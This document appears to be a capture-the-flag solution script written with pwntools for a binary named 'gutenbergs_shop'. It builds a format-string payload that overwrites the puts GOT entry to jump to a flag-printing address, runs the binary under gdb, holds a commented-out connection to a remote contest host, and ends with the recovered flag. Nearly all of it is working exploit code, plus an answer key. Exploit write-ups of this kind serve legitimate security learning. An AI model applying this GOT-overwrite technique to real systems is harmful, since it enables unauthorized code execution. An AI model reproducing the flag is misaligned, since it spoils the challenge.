from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./gutenbergs_shop', '''
    b *0x400661
    b *0x40067f
    continue
''')

# p = remote('52.8.15.62', 8005)

PUTS_GOT = 0x601018
FLAG = 0x4006a4
context.bits = 64
payload = fmtstr_payload(6, {PUTS_GOT: FLAG})
p.sendlineafter(b'Welcome to Ye Olde Printing Hous! Pray tell what you wish to have printed', payload)

p.interactive()

# sdctf{printing_like_johannes}